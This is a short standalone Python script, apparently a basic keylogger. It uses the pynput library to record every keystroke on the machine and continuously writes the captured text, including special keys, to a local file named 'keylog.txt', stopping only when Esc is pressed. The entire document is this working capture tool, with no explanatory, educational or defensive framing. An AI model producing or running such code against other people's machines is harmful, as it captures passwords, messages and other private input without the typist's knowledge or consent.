import pynput.keyboard

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        else:
            log += " " + str(key) + " "

    with open("keylog.txt", "w") as f:
        f.write(log)

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
